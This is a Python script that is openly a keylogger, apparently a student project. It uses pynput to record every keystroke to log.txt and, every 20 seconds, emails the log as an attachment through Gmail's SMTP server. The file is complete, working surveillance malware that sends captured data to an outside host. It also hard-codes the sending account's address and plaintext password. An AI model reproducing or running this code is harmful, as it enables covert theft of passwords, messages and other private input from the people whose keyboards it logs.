from datetime import datetime, timedelta
from pynput import keyboard
import smtplib
from email.message import EmailMessage

print("\n!!!Keylogger.py is now running!!!\n Starting to log keys...")

def time_stamp():
    time_date = datetime.now()
    return time_date.strftime("%H:%M:%S %d/%m/%Y")

def email_send(subject, attachment, count):
    email = "keyloggerunsw@gmail.com" #variables for email_send function
    password = "Ilovelogging123$"
    email_char_length = 0
    with open("log.txt", "rb") as attachmentfile:
        attachmentfile_body = attachmentfile.read()
        attachmentfile_name = attachmentfile.name
        if count == True:
            email_char_length = len(attachmentfile_body)
    message = EmailMessage()
    if count == True:
        message['Subject'] = str(str(subject) + ", len = {}".format(email_char_length))
    else:
        message['Subject'] = subject
    message['From'] = email
    message['To'] = email
    message.set_content("Next letter should come in 10 mins if keylogger still running.")
    if attachment == True:
        message.add_attachment(attachmentfile_body, maintype='text', subtype='plain', filename=attachmentfile_name)

    #send the email
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(email, password)
        smtp.send_message(message)

temp_input_cache = ""
temp_time_cache_write = datetime.now() #set up timer for writing
temp_time_cache_email = datetime.now() #set up timer for emailing

def clean_key(input):
    temp_key_handler = str(input).strip("'").strip('"').replace("Key.space", " ").replace("Key.enter", "\n").replace("Key.caps_lock"," <Key.caps_lock> ").replace("Key.shift", "")
    if "Key.backspace" == temp_key_handler:
        temp_key_handler = ""
    return temp_key_handler

def write_to_file(text_to_write):
    with open("log.txt", "a") as log:
        log.write(text_to_write)
        log.write("\n\n -----------[File Saved at {}]-----------\n\n".format(time_stamp()))

def on_press(key):
    global temp_time_cache_write
    global temp_time_cache_email
    global temp_input_cache
    if key == keyboard.Key.backspace and len(temp_input_cache) > 0:
        temp_input_cache = temp_input_cache[:-1]
    temp_input_cache += clean_key(key)

    if datetime.now() > temp_time_cache_email+timedelta(seconds=20):
        write_to_file(temp_input_cache)
        temp_input_cache = "" #flush the 'cache'
        email_send(subject = "Key Log", attachment = True, count = True)
        print("\n --- Email with log.txt file sent! --- \n")
        temp_time_cache_email = datetime.now() #resets the EMAIL time_cache back to current time

    elif datetime.now() > temp_time_cache_write+timedelta(seconds=10):
        write_to_file(temp_input_cache)
        print("\n--- Wrote logged keys to log.txt file! ---\n ")
        temp_input_cache = "" #flush the 'cache'
        temp_time_cache_write = datetime.now() #resets the WRITING time_cache back to current time

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
